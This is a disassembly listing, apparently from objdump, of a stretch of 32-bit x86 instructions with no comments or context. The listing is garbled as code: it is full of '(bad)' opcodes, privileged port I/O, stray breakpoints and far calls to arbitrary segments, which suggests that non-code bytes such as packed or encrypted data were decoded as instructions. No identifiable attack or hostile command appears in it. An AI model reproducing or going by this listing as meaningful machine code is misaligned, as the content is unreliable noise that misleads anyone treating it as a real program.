  4088f7:	push   0xffffffdd
  4088f9:	stos   BYTE PTR es:[edi],al
  4088fa:	inc    ebp
  4088fb:	lods   eax,DWORD PTR ds:[esi]
  4088fc:	mov    edi,0x5e68c249
  408901:	jne    0x40891e
  408903:	in     al,dx
  408904:	icebp  
  408905:	cmp    edi,ebp
  408907:	sahf   
  408908:	ret    0x17f6
  40890b:	(bad)  
  40890c:	sbb    dh,BYTE PTR ds:0x7b63780d
  408912:	aaa    
  408913:	push   ebx
  408914:	lods   eax,DWORD PTR ds:[esi]
  408915:	test   DWORD PTR [ebx-0x17],ebx
  408918:	enter  0x1ec5,0xf3
  40891c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40891d:	inc    esp
  40891e:	xor    BYTE PTR ds:0xee6471b3,al
  408924:	pushf  
  408925:	sbb    al,BYTE PTR [ecx-0x10e6621d]
  40892b:	xor    BYTE PTR [ecx-0x46445733],ah
  408931:	adc    edi,edx
  408933:	enter  0x51b0,0x66
  408937:	or     DWORD PTR [edx+0x66fdeab1],edx
  40893d:	(bad)  [edi+eax*2-0x4f]
  408941:	fadd   DWORD PTR [eax+0x54685243]
  408947:	data16 jnp 0x40894a
  40894a:	jnp    0x4089b6
  40894c:	test   al,0xca
  40894e:	retf   
  40894f:	adc    eax,0xe9f7b78c
  408954:	int    0xc1
  408956:	pop    edi
  408957:	push   es
  408958:	aam    0xe2
  40895a:	clc    
  40895b:	stos   DWORD PTR es:[edi],eax
  40895c:	inc    eax
  40895d:	pusha  
  40895e:	mov    BYTE PTR [edi-0x5a],cl
  408961:	test   edi,edi
  408963:	sub    al,0xca
  408965:	ret    0xd722
  408968:	or     bh,BYTE PTR [edx+0x1e6c86cf]
  40896e:	in     al,dx
  40896f:	jmp    0x40893e
  408971:	add    BYTE PTR [ebp-0x6d],ah
  408974:	mov    ?,WORD PTR [ebp+0x3e427c70]
  40897a:	adc    BYTE PTR [edx+0x62de9f72],dl
  408980:	ffree  st(2)
  408982:	sub    bh,BYTE PTR [edx-0x69933751]
  408988:	push   ss
  408989:	jmp    0x40894c
  40898b:	add    dh,BYTE PTR [edx+0x52]
  40898e:	jge    0x4089b1
  408990:	xchg   ecx,eax
  408991:	cdq    
  408992:	and    BYTE PTR [edx],cl
  408994:	out    dx,al
  408995:	pop    eax
  408996:	lods   al,BYTE PTR ds:[esi]
  408997:	int    0x3a
  408999:	push   ebp
  40899a:	or     eax,0x2a818bff
  40899f:	test   al,0xe0
  4089a1:	in     al,dx
  4089a2:	pop    ss
  4089a3:	pop    ecx
  4089a4:	(bad)  
  4089a5:	sbb    dh,BYTE PTR [edi+0x28]
  4089a8:	pop    ebx
  4089a9:	sub    eax,0xee8b95da
  4089ae:	jo     0x408a14
  4089b0:	(bad)  
  4089b1:	call   0x8773:0x3f398b08
  4089b8:	ret    0x6ff3
  4089bb:	mov    bl,0x58
  4089bd:	jnp    0x4089a7
  4089bf:	fstp   TBYTE PTR [edx-0x4cc9bc79]
  4089c5:	jecxz  0x408a45
  4089c7:	pop    ss
  4089c8:	out    0xcd,eax
  4089ca:	dec    edx
  4089cb:	daa    
  4089cc:	lea    eax,[ecx+0x215a692d]
  4089d2:	sub    eax,0x707ef484
  4089d7:	dec    ecx
  4089d8:	mov    ?,WORD PTR [esi-0x7]
  4089db:	in     al,dx
  4089dc:	xchg   edi,eax
  4089dd:	in     al,dx
  4089de:	icebp  
  4089df:	cmp    al,0xac
  4089e1:	cs push eax
  4089e3:	sub    eax,0x197d375
  4089e8:	lds    ecx,FWORD PTR [ebp-0x5ef20d56]
  4089ee:	(bad)  
  4089ef:	loop   0x408a0c
  4089f1:	pop    eax
  4089f2:	pop    edi
  4089f3:	popa   
  4089f4:	xchg   edx,eax
  4089f5:	out    0x60,al
  4089f7:	pop    eax
  4089f8:	cli    
  4089f9:	sub    esp,DWORD PTR [ecx+0x6b08bd12]
  4089ff:	inc    ebp
  408a00:	mov    gs,WORD PTR [ecx]
  408a02:	pop    esp
  408a03:	(bad)  
  408a04:	std    
  408a05:	adc    esp,DWORD PTR [eax+0x1f]
  408a08:	outs   dx,BYTE PTR ds:[esi]
  408a09:	fwait
  408a0a:	pop    esi
  408a0b:	push   edx
  408a0c:	aad    0x54
  408a0e:	call   0x8e69:0xe902b29b
  408a15:	test   al,0x5
  408a17:	xor    edx,edi
  408a19:	mov    ch,0x22
  408a1b:	repnz idiv BYTE PTR [edi]
  408a1e:	es mov al,0x4f
  408a21:	push   cs
  408a22:	out    dx,eax
  408a23:	xor    DWORD PTR [ecx+edx*8+0xbf49567],ebx
  408a2a:	stc    
  408a2b:	lock xchg edi,eax
  408a2d:	fcom   DWORD PTR [ebx-0x74]
  408a30:	pop    eax
  408a31:	and    eax,0x3b6ba4f
  408a36:	call   0x9fd4a9c2
  408a3b:	jmp    0x408a16
  408a3d:	mov    fs,WORD PTR [ebp-0x7e]
  408a40:	push   DWORD PTR [ecx-0x9]
  408a43:	add    al,BYTE PTR [edx-0x46bf354c]
  408a49:	and    al,0x16
  408a4b:	cmp    cl,BYTE PTR [edx+0x17bd0c4a]
  408a51:	icebp  
  408a52:	(bad)  
  408a53:	popf   
  408a54:	inc    ebx
  408a55:	ror    dh,0x82
  408a58:	jno    0x408a40
  408a5a:	in     al,dx
  408a5b:	sar    ebx,0x36
  408a5e:	ror    DWORD PTR [edx],1
  408a60:	clc    
  408a61:	and    bh,ah
  408a63:	pop    edi
  408a64:	data16 cmp ch,BYTE PTR [ecx+edi*4-0x69]
  408a69:	ss scas eax,DWORD PTR es:[edi]
  408a6b:	xchg   dx,ax
  408a6d:	mov    bl,0xcb
  408a6f:	and    DWORD PTR [esi],edx
  408a71:	pop    ebx
  408a72:	xchg   ebx,eax
  408a73:	jl     0x408ab6
  408a75:	xor    bl,BYTE PTR [eax+0x30]
  408a78:	aam    0x2d
  408a7a:	push   ds
  408a7b:	jecxz  0x408a8c
  408a7d:	test   al,0x80
  408a7f:	daa    
  408a80:	cmp    BYTE PTR [edi+0x7067fe91],bh
  408a86:	icebp  
  408a87:	loop   0x408a35
  408a89:	je     0x408a3b
  408a8b:	rcl    BYTE PTR [edx],0x5
  408a8e:	arpl   WORD PTR [ecx],dx
  408a90:	das    
  408a91:	mov    bl,0x3b
  408a93:	or     ecx,DWORD PTR [ecx]
  408a95:	daa    
  408a96:	imul   ecx,DWORD PTR [ecx+0x7420106],0xffffffde
  408a9d:	je     0x408ab3
  408a9f:	mov    dh,0x21
  408aa1:	sub    eax,0x4a6de716
  408aa6:	imul   edx,ebp,0x18
  408aa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aaa:	sbb    eax,0x9ae48d53
  408aaf:	mov    ds:0x83a482e7,al
  408ab4:	xchg   ecx,eax
  408ab5:	inc    ebp
  408ab6:	and    ah,0x7a
  408ab9:	dec    ebp
  408aba:	imul   esp,DWORD PTR [ebx],0x7bb811d4
  408ac0:	out    dx,eax
  408ac1:	mov    dh,0xd3
  408ac3:	cmp    al,0xe9
  408ac5:	dec    ecx
  408ac6:	xchg   esi,eax
  408ac7:	and    al,0xaa
  408ac9:	loope  0x408a5f
  408acb:	das    
  408acc:	and    al,0xaf
  408ace:	or     ch,ah
  408ad0:	dec    edi
  408ad1:	pop    es
  408ad2:	or     ecx,ebp
  408ad4:	fdivr  QWORD PTR [esi]
  408ad6:	add    al,0xa
  408ad8:	or     eax,0xce323724
  408add:	jnp    0x408b20
  408adf:	mov    dh,0x86
  408ae1:	mov    esi,0x306d3254
  408ae6:	sbb    eax,0x2aaac788
  408aeb:	icebp  
  408aec:	jbe    0x408b2e
  408aee:	jg     0x408a80
  408af0:	mov    ebx,ebp
  408af2:	jecxz  0x408a77
  408af4:	or     edi,DWORD PTR [edx+0x275534dd]
  408afa:	dec    eax
  408afb:	lds    edi,FWORD PTR [edx+0x5b]
  408afe:	xchg   ebx,eax
  408aff:	loopne 0x408b68
  408b01:	dec    ebx
  408b02:	cdq    
  408b03:	idiv   esi
  408b05:	push   edx
  408b06:	out    dx,al
  408b07:	jo     0x408b2c
  408b09:	fdiv   QWORD PTR [ecx+edx*4]
  408b0c:	mov    esi,DWORD PTR [ebp-0x39]
  408b0f:	stos   BYTE PTR es:[edi],al
  408b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b11:	dec    esp
  408b12:	pop    esp
  408b13:	test   BYTE PTR [eax-0x25556708],dh
  408b19:	sbb    BYTE PTR [edx],dh
  408b1b:	jge    0x408aea
  408b1d:	(bad)  
  408b1e:	mov    cl,0xfe
  408b20:	sbb    al,BYTE PTR [ebx]
  408b22:	shr    BYTE PTR [esi-0x41],0x48
  408b26:	neg    DWORD PTR [esi+0x4c]
  408b29:	pop    ds
  408b2a:	aaa    
  408b2b:	mov    ebx,0x5d7b3033
  408b30:	int3   
  408b31:	(bad)  
  408b32:	retf   0x3072
  408b35:	retf   
  408b36:	fdiv   DWORD PTR [ebx-0x4311cfba]
  408b3c:	in     al,dx
  408b3d:	jbe    0x408b87
  408b3f:	out    0xfa,eax
  408b41:	dec    edi
  408b42:	mov    WORD PTR [ecx+0x3ce7114b],cs
  408b48:	lock jns 0x408b24
  408b4b:	aas    
  408b4c:	xchg   edx,eax
  408b4d:	(bad)  
  408b4e:	test   eax,edx
  408b50:	inc    ebp
  408b51:	je     0x408b99
  408b53:	sub    esp,DWORD PTR [edx-0x62]
  408b56:	outs   dx,DWORD PTR ds:[esi]
  408b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b58:	push   es
  408b59:	push   0xffffffa0
  408b5b:	lds    ebx,FWORD PTR [ecx]
  408b5d:	lock xchg ebp,eax
  408b5f:	sub    al,0x79
  408b61:	jnp    0x408b66
  408b63:	sbb    DWORD PTR [ebx+0x57],ebp
  408b66:	fdivr  QWORD PTR [edi+eax*4]
  408b69:	jae    0x408b8b
  408b6b:	test   cl,ah
  408b6d:	in     eax,0x39
  408b6f:	dec    esp
  408b70:	jmp    0x515935b9
  408b75:	ret    0xdd31
  408b78:	dec    esp
  408b79:	inc    edi
  408b7a:	ret    
  408b7b:	in     al,dx
  408b7c:	mov    edi,0x5ca14a04
  408b81:	in     eax,dx
  408b82:	shr    BYTE PTR [ecx+edi*8-0x5e3390e2],0x6e
  408b8a:	xchg   edx,eax
  408b8b:	xchg   ecx,eax
  408b8c:	fs aaa 
  408b8e:	in     al,0x47
  408b90:	addr16 (bad) 
  408b92:	mov    ebp,0x997e419e
  408b97:	xchg   ebx,eax
  408b98:	mov    edx,0x49283bba
  408b9d:	jmp    0xe3948990
  408ba2:	ret    0x4dad
  408ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ba6:	dec    ebp
  408ba7:	xor    DWORD PTR [ebp+ebp*1+0x2c],eax
  408bab:	scas   al,BYTE PTR es:[edi]
  408bac:	push   edi
  408bad:	(bad)  
  408bae:	ins    DWORD PTR es:[edi],dx
  408baf:	mov    cl,0x51
  408bb1:	push   ecx
  408bb2:	fstp   TBYTE PTR [ebx]
  408bb4:	and    BYTE PTR [ebx-0x5d],0x81
  408bb8:	int    0x5d
  408bba:	iret   
  408bbb:	add    eax,0xfb387ef
  408bc0:	push   eax
  408bc1:	lds    edi,FWORD PTR [edi-0x1dbda980]
  408bc7:	xor    eax,0x6c0dd46a
  408bcc:	mov    esi,0xed7c4800
  408bd1:	adc    eax,0xbeb0919
  408bd6:	sbb    BYTE PTR [ecx-0x4],0xc9
  408bda:	add    dh,cl
  408bdc:	pop    ecx
  408bdd:	mov    al,ds:0xc3dfabe9
  408be2:	(bad)
  408be6:	sbb    al,0xcf
  408be8:	out    0xa8,al
  408bea:	mov    ecx,0x90aa7412
  408bef:	pop    ebx
  408bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bf1:	pop    esi
  408bf2:	mov    esi,0x4baa417
  408bf7:	push   ecx
  408bf8:	xor    ah,cl
  408bfa:	lock xlat BYTE PTR ds:[ebx]
  408bfc:	dec    ebp
  408bfd:	push   eax
  408bfe:	inc    edi
  408bff:	mov    bl,0x52
  408c01:	cmp    esp,eax
  408c03:	fisub  WORD PTR [eax-0x1e7a3fd5]
  408c09:	inc    ebx
  408c0a:	cwde   
  408c0b:	pop    esi
  408c0c:	and    BYTE PTR [eax+0x973f83f],cl
  408c12:	sub    eax,0x6e320107
  408c17:	cmp    al,0xac
  408c19:	icebp  
  408c1a:	ss inc eax
  408c1c:	jb     0x408c4f
  408c1e:	xchg   esp,eax
  408c1f:	pop    edi
  408c20:	jae    0x408c5f
  408c22:	shl    eax,cl
  408c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c25:	push   0x29fec995
  408c2a:	lahf   
  408c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c2c:	fsubr  DWORD PTR [ebp+0x66]
  408c2f:	add    al,0xb
  408c31:	repnz outs dx,BYTE PTR ds:[esi]
  408c33:	and    ah,bh
  408c35:	mov    esp,0xb520ca0e
  408c3a:	xchg   edx,eax
  408c3b:	ins    BYTE PTR es:[edi],dx
  408c3c:	retf   
  408c3d:	and    cl,cl
  408c3f:	aam    0xd4
  408c41:	and    edx,DWORD PTR [edx]
  408c43:	shl    DWORD PTR [eax-0x1b],1
  408c46:	xor    al,0x40
  408c48:	das    
  408c49:	mov    ds:0xfcff506a,eax
  408c4e:	jno    0x408bfd
  408c50:	cmc    
  408c51:	lods   eax,DWORD PTR ds:[esi]
  408c52:	std    
  408c53:	inc    ecx
  408c54:	or     ch,BYTE PTR [ebp-0x5b]
  408c57:	sahf   
  408c58:	in     al,0x77
  408c5a:	pop    ebx
  408c5b:	lahf   
  408c5c:	sub    dh,dl
  408c5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c5f:	jge    0x408c15
  408c61:	(bad)  
  408c63:	repz sbb DWORD PTR [eax-0x2e],0x2a
  408c68:	or     eax,0x8375d26
  408c6d:	test   al,0xa5
  408c6f:	mov    ds:0xd0f9fb,eax
  408c74:	test   al,0x21
  408c76:	mov    ah,0x4
  408c78:	pusha  
  408c79:	pop    ds
  408c7a:	sub    DWORD PTR [ecx],0x5a763fe3
  408c80:	and    eax,0x869162c8
  408c85:	repnz das 
  408c87:	xor    ebx,DWORD PTR [ebp-0x37]
  408c8a:	or     dl,BYTE PTR [edx-0x37]
  408c8d:	loope  0x408d05
  408c8f:	aaa    
  408c90:	fwait
  408c91:	jg     0x408c66
  408c93:	sti    
  408c94:	pop    ecx
  408c95:	push   0xffffff9e
  408c97:	add    ebx,ebp
  408c99:	mov    al,0xaf
  408c9b:	int3   
  408c9c:	mov    ah,0xc
  408c9e:	add    DWORD PTR [edx-0x17],0xffffff88
  408ca2:	sub    al,0x72
  408ca4:	pop    edi
  408ca5:	adc    esp,ebp
  408ca7:	ds pop eax
  408ca9:	addr16 call 0x1b08:0x64aba7c9
  408cb1:	popf   
  408cb2:	and    al,0x1a
  408cb4:	lea    ecx,[ebp+0x16d5bb89]
  408cba:	lahf   
  408cbb:	fcomp  DWORD PTR ds:0xdbcbbb09
  408cc1:	adc    bh,dl
  408cc3:	push   ss
  408cc4:	iret   
  408cc5:	out    0xa0,eax
  408cc7:	das    
  408cc8:	sti    
  408cc9:	xor    al,0x51
  408ccb:	add    esp,esp
  408ccd:	icebp  
  408cce:	imul   edx,DWORD PTR [ecx+0x3f],0xcbc12e8d
  408cd5:	add    BYTE PTR [edx+eax*4],dh
  408cd8:	jmp    0x408d2c
  408cda:	stc    
  408cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cdc:	addr16 inc esp
  408cde:	push   esi
  408cdf:	jb     0x408d31
  408ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ce2:	mov    ebx,0x525befc0
  408ce7:	in     al,dx
  408ce8:	loopne 0x408cf1
  408cea:	(bad)  
  408ceb:	or     eax,0xde3b9a4e
  408cf0:	lds    edi,FWORD PTR [eax-0x6dfd2a81]
  408cf6:	mov    edx,0x61b93330
  408cfb:	adc    DWORD PTR [eax-0x5b],edx
  408cfe:	daa    
  408cff:	scas   eax,DWORD PTR es:[edi]
  408d00:	dec    eax
  408d01:	add    BYTE PTR [ecx],ch
  408d03:	jle    0x408d3d
  408d05:	test   eax,0xce526491
  408d0a:	inc    edx
  408d0b:	jo     0x408d78
  408d0d:	add    al,0x2c
  408d0f:	sub    eax,0xafb7ae41
  408d14:	call   0xec2ce915
  408d19:	cld    
  408d1a:	and    BYTE PTR [esi+0x50],dh
  408d1d:	mov    ah,0x9e
  408d1f:	jne    0x408ccb
  408d21:	loopne 0x408cce
  408d23:	pop    es
  408d24:	mov    esp,0x3a802c81
  408d29:	adc    BYTE PTR ds:[ebp-0x3d],dh
  408d2d:	mov    cl,0x6
  408d2f:	xor    DWORD PTR ds:0x175484b4,ebx
  408d35:	mov    edi,0xe90c56d1
  408d3a:	mov    esi,0x4fd705e2
  408d3f:	xor    dh,BYTE PTR [eax+eax*2]
  408d42:	or     esp,DWORD PTR [esi-0x401b4720]
  408d48:	arpl   WORD PTR es:[edx+0x33],di
  408d4c:	cmp    al,0xbf
  408d4e:	push   0xaa3ce710
  408d53:	jmp    0x6ba658be
  408d58:	adc    ecx,DWORD PTR [ebp+0x9]
  408d5b:	jmp    0x408daf
  408d5d:	mov    bh,0x9d
  408d5f:	xchg   esi,eax
  408d60:	xchg   esp,eax
  408d61:	mov    esi,0xa14d6d9e
  408d66:	add    eax,0x74e5ccb5
  408d6b:	dec    ecx
  408d6c:	add    dh,dl
  408d6e:	add    DWORD PTR [esi-0x287b376b],eax
  408d74:	adc    BYTE PTR [edx],dh
  408d76:	jle    0x408d13
  408d78:	pusha  
  408d79:	mov    edx,0x3151d7b5
  408d7e:	popa   
  408d7f:	adc    al,0x66
  408d81:	fwait
  408d82:	mov    esi,0xfca67b5f
  408d87:	push   eax
  408d88:	leave  
  408d89:	nop
  408d8a:	into   
  408d8b:	and    eax,0x4aa0ebd7
  408d90:	inc    ebx
  408d91:	mov    bh,0x54
  408d93:	psllw  mm5,mm0
  408d96:	sub    BYTE PTR ds:0x1d112455,dl
  408d9c:	add    DWORD PTR [ecx],ebp
  408d9e:	cmp    bh,BYTE PTR [ecx*2-0x4d57ea9a]
  408da5:	mov    DWORD PTR [ecx],0x66bfd329
  408dab:	xchg   esi,eax
  408dac:	ins    DWORD PTR es:[edi],dx
  408dad:	xor    dh,cl
  408daf:	sti    
  408db0:	mov    esp,0xa883b70
  408db5:	cld    
  408db6:	das    
  408db7:	xor    ebx,DWORD PTR [ecx+0x3f7eb0bb]
  408dbd:	dec    esp
  408dbe:	pop    ss
  408dbf:	pop    ds
  408dc0:	xchg   ebx,eax
  408dc2:	int3   
  408dc3:	adc    al,0xff
  408dc5:	idiv   DWORD PTR [edi+0x6e85acd5]
  408dcb:	mov    esp,0x25912e14
  408dd0:	rol    DWORD PTR [ecx],cl
  408dd2:	pop    edx
  408dd3:	into   
  408dd4:	adc    ch,ch
  408dd6:	sbb    bh,0xe
  408dd9:	adc    ah,cl
  408ddb:	push   ebp
  408ddc:	dec    eax
  408ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dde:	dec    ebp
  408ddf:	adc    ch,BYTE PTR [edi-0x7220b6b1]
  408de5:	xchg   edi,eax
  408de6:	dec    ecx
  408de7:	cmp    eax,DWORD PTR [eax]
  408de9:	out    0x4e,al
  408deb:	mov    dh,0xf0
  408ded:	(bad)  
  408dee:	and    eax,DWORD PTR [ebp+edi*2+0x1a6d75b4]
  408df5:	sub    eax,0x7f5c8ebf
  408dfa:	out    dx,al
  408dfb:	adc    ah,ch
  408dfd:	std    
  408dfe:	mov    eax,0x82c01372
  408e03:	bound  esp,QWORD PTR [edi]
  408e05:	cs push ecx
  408e07:	call   0xc122:0x98171677
  408e0e:	arpl   WORD PTR [ebp-0xf796c10],cx
  408e14:	xor    dl,cl
  408e16:	adc    BYTE PTR [edi],dh
  408e18:	in     eax,dx
  408e19:	push   esi
  408e1a:	xor    eax,0x3fcac151
  408e1f:	out    dx,al
  408e20:	or     edi,esi
  408e22:	test   DWORD PTR [edi-0x52c5bae5],ecx
  408e28:	jnp    0x408e3c
  408e2a:	jl     0x408e92
  408e2c:	adc    BYTE PTR [ecx],bh
  408e2e:	xor    ecx,esp
  408e30:	rcr    DWORD PTR [ebx],1
  408e32:	pusha  
  408e33:	sar    DWORD PTR [eax],cl
  408e35:	mov    bh,0xd4
  408e37:	and    BYTE PTR [edi],bh
  408e39:	dec    ecx
  408e3a:	push   ebp
  408e3b:	retf   0xd858
  408e3e:	in     eax,dx
  408e3f:	jno    0x408e5e
  408e41:	test   edi,edx
  408e43:	inc    eax
  408e44:	sub    dl,bl
  408e46:	rcl    BYTE PTR [esi],0x4b
  408e49:	popf   
  408e4a:	call   0xf8bae0c
  408e4f:	mov    ebp,0x3a2e4dc6
  408e54:	inc    edi
  408e55:	nop
  408e56:	call   0xa377:0x15a27b77
  408e5d:	pop    edi
  408e5e:	jae    0x408e6e
  408e60:	iret   
  408e61:	(bad)  
  408e62:	out    dx,al
  408e63:	adc    cl,dh
  408e65:	sti    
  408e66:	pop    ebp
  408e67:	cmp    eax,0x8936680e
  408e6c:	call   0xa726169b
  408e71:	in     al,dx
  408e72:	push   0xfe669e14
  408e77:	mov    dl,BYTE PTR [esi]
  408e79:	xor    BYTE PTR [ebx],0x7
  408e7c:	loopne 0x408e34
  408e7e:	clc    
  408e7f:	mov    BYTE PTR [ecx],ch
  408e81:	and    bh,BYTE PTR [edx]
  408e83:	outs   dx,DWORD PTR ds:[esi]
  408e84:	sbb    eax,0x82229c1b
  408e89:	pop    ecx
  408e8a:	or     ecx,DWORD PTR [edx-0x20032960]
  408e90:	pusha  
  408e91:	xchg   DWORD PTR [ebp+0x2ca3664c],ebp
  408e97:	sub    dh,cl
  408e99:	sar    ah,cl
  408e9b:	jbe    0x408ea2
  408e9d:	push   ebp
  408e9e:	pushf  
  408e9f:	add    eax,0x21d3ad74
  408ea4:	push   esp
  408ea5:	aam    0xd3
  408ea7:	leave  
  408ea8:	push   ebp
  408ea9:	push   0x6a9e0126
  408eae:	inc    ecx
  408eaf:	mov    bl,0x4b
  408eb1:	pop    ecx
  408eb2:	xchg   DWORD PTR [edi+0x41],ebp
  408eb5:	cmp    ebx,ebx
  408eb7:	inc    esp
  408eb8:	inc    esi
  408eb9:	test   BYTE PTR ds:0x7793e7fe,cl
  408ebf:	jb     0x408f0c
  408ec1:	cdq    
  408ec2:	ins    BYTE PTR es:[edi],dx
  408ec3:	call   0x6988:0x25f83f5e
  408eca:	scas   al,BYTE PTR es:[edi]
  408ecb:	(bad)  
  408ecc:	addr16 mov dl,ch
  408ecf:	and    bh,BYTE PTR [ecx-0x7730f08a]
  408ed5:	push   ss
  408ed6:	xor    edi,ebx
  408ed8:	aaa    
  408ed9:	cwde   
  408eda:	rol    BYTE PTR [eax],cl
  408edc:	mov    esi,0xf7aedc25
  408ee1:	ins    DWORD PTR es:[edi],dx
  408ee2:	xor    eax,0x47d5e483
  408ee7:	push   edi
  408ee8:	jg     0x408ee0
  408eea:	fwait
  408eeb:	cmp    dl,dh
  408eed:	nop
  408eee:	aam    0xa
  408ef0:	fbld   TBYTE PTR [eax-0x34]
  408ef3:	outs   dx,BYTE PTR ds:[esi]
  408ef4:	fld    QWORD PTR [eax+0x10]
  408ef7:	mov    DWORD PTR [edx],esp
  408ef9:	cmp    eax,0x557206de
  408efe:	test   al,0xe4
  408f00:	(bad)  
  408f01:	dec    edi
  408f02:	mov    esi,0xc7b6d5d1
  408f07:	mov    al,ds:0x877d2068
  408f0c:	mov    ebp,0x8ffdf2e9
  408f11:	cli    
  408f12:	xor    bx,WORD PTR es:[esp+eax*1-0x75]
  408f18:	in     eax,0x68
  408f1a:	js     0x408f47
  408f1c:	mov    dh,0x69
  408f1e:	and    BYTE PTR [ebp+0x4b49ef08],ch
  408f24:	xchg   esp,eax
  408f25:	sbb    eax,0x3f806496
  408f2a:	test   eax,0x417f5e27
  408f2f:	dec    esp
  408f30:	out    0x1d,eax
  408f32:	xchg   ecx,eax
  408f33:	bound  edx,QWORD PTR [bp+0x1ab5]
  408f38:	mov    edi,0x3ed5ac8c
  408f3d:	dec    ebx
  408f3e:	rcr    cl,0xb9
  408f41:	cs push ds
  408f43:	(bad)
  408f47:	xchg   DWORD PTR [edi+0x1bd54ec8],ecx
  408f4d:	inc    ebp
  408f4e:	add    cl,BYTE PTR [edi+0x67a9c962]
  408f54:	inc    ebp
  408f55:	scas   al,BYTE PTR es:[edi]
  408f56:	adc    esi,DWORD PTR [ebx]
  408f58:	push   cs
  408f59:	or     esi,ebp
  408f5b:	lods   al,BYTE PTR ds:[esi]
  408f5c:	pop    ecx
  408f5d:	or     bl,0x4a
  408f60:	popa   
  408f61:	mov    esp,0xb81009ea
  408f66:	or     BYTE PTR [edx-0x4c],bh
  408f69:	mov    edx,0x85059c94
  408f6e:	pop    ecx
  408f6f:	and    al,0xb2
  408f71:	adc    bl,BYTE PTR [eax]
  408f73:	jl     0x408f91
  408f75:	enter  0x2e2e,0x97
  408f79:	test   al,0xec
  408f7b:	push   cs
  408f7c:	jle    0x408f78
  408f7e:	pop    ebp
  408f7f:	(bad)  
  408f80:	lahf   
  408f81:	(bad)  
  408f82:	stos   DWORD PTR es:[edi],eax
  408f83:	add    al,BYTE PTR [ebx]
  408f85:	cs daa 
  408f87:	cdq    
  408f88:	arpl   WORD PTR [ebx-0x70],di
  408f8b:	dec    ebx
  408f8c:	adc    BYTE PTR [edx+ebp*2+0x43],dl
  408f90:	stos   DWORD PTR es:[edi],eax
  408f91:	push   edi
  408f92:	pop    edi
  408f93:	(bad)  
  408f94:	fld    QWORD PTR [edx]
  408f96:	jl     0x408f1d
  408f98:	inc    ebp
  408f99:	daa    
  408f9a:	(bad)  
  408f9b:	jne    0x408f61
  408f9d:	and    BYTE PTR [ebx-0xfea52a2],bh
  408fa3:	leave  
  408fa4:	mov    cl,0x5b
  408fa6:	fld    DWORD PTR [edx-0x5e]
  408fa9:	inc    eax
  408faa:	pop    esp
  408fab:	(bad)  
  408fac:	out    0x88,eax
  408fae:	out    0xbe,eax
  408fb0:	push   0xffffffb6
  408fb2:	in     al,dx
  408fb3:	adc    cl,cl
  408fb5:	and    edx,DWORD PTR [ebx-0x1b]
  408fb8:	and    esp,ebx
  408fba:	into   
  408fbb:	jmp    DWORD PTR [ebx-0x6a354b85]
  408fc1:	mov    edx,0x6b5e368
  408fc6:	cmp    edx,ebx
  408fc8:	push   0xffffffcf
  408fca:	jge    0x408ff7
  408fcc:	sti    
  408fcd:	dec    edx
  408fce:	adc    eax,DWORD PTR [edi]
  408fd0:	dec    eax
  408fd1:	and    ebx,DWORD PTR [edi-0x71c97de6]
  408fd7:	or     al,0xe6
  408fd9:	mov    ah,0x95
  408fdb:	nop
  408fdc:	out    dx,al
  408fdd:	mov    dh,0x88
  408fdf:	arpl   WORD PTR [edi+0x43deb37b],si
  408fe5:	mov    cl,0x59
  408fe7:	jnp    0x408fe1
  408fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fea:	mov    al,0x9f
  408fec:	fsubr  DWORD PTR [ecx]
  408fee:	cmp    al,0x6b
  408ff0:	inc    ebp
  408ff1:	fistp  DWORD PTR [edi]
  408ff3:	sub    esp,ecx
  408ff5:	mov    bl,0x2a
  408ff7:	mov    cl,0x27
  408ff9:	and    bh,BYTE PTR [edx-0x278c08c6]
  408fff:	sahf   
  409000:	mov    cl,0x1f
  409002:	sti    
  409003:	ss mov ch,0x86
  409006:	adc    esp,DWORD PTR [edi-0x647b4ed6]
  40900c:	xchg   dh,ah
  40900e:	in     al,0x6a
  409010:	cmp    esi,DWORD PTR [esi+ecx*8]
  409013:	cli    
  409014:	jns    0x409068
  409016:	mov    DWORD PTR [ebp+0x4a],ebx
  409019:	add    BYTE PTR [ebx],ch
  40901b:	xchg   edi,eax
  40901c:	add    al,BYTE PTR [edx]
  40901e:	shl    BYTE PTR [ebp-0x21],0x90
  409022:	adc    ch,BYTE PTR [eax+edx*2+0x1a72d72f]
  409029:	cmp    eax,0xa985dc9e
  40902e:	rcl    BYTE PTR [ebx],1
  409030:	sub    edi,DWORD PTR [eax+0x544bbeb5]
  409036:	bound  esp,QWORD PTR [ebx+0x41]
  409039:	push   ecx
  40903a:	shr    DWORD PTR [ecx+0x21017e81],0x9
  409041:	pop    ebx
  409042:	sbb    BYTE PTR [edx+0x46],0x6f
  409046:	adc    ch,BYTE PTR [ebp+0x66d744f9]
  40904c:	inc    ecx
  40904d:	mov    ebp,0x1863dd31
  409052:	leave  
  409053:	jmp    0x4aea:0x5c36b5e
  40905a:	jecxz  0x409012
  40905c:	mov    dl,0x26
  40905e:	in     al,0xb2
  409060:	iret   
  409061:	push   edx
  409062:	stos   BYTE PTR es:[edi],al
  409063:	jo     0x40908b
  409065:	jb     0x40903e
  409067:	imul   ecx,DWORD PTR [edx+0x35],0x908798aa
  40906e:	sti    
  40906f:	ss cs jecxz 0x4090da
  409073:	nop
  409074:	mov    edi,0xbe1fe4f4
  409079:	sub    ebp,eax
  40907b:	pop    ss
  40907c:	cli    
  40907d:	adc    DWORD PTR [ecx+0x64],esi
  409080:	inc    DWORD PTR [ebx-0x4f]
  409083:	jb     0x4090fb
  409085:	ret    
  409086:	call   0xf6d1:0xd004cbcb
  40908d:	pop    edx
  40908e:	mov    edi,0x4dacc624
  409093:	jp     0x409038
  409095:	rcr    DWORD PTR [edx],0x5f
  409098:	sbb    al,0x97
  40909a:	addr16 pop esp
  40909c:	mov    bh,BYTE PTR ds:0x78f93aa
  4090a2:	(bad)  
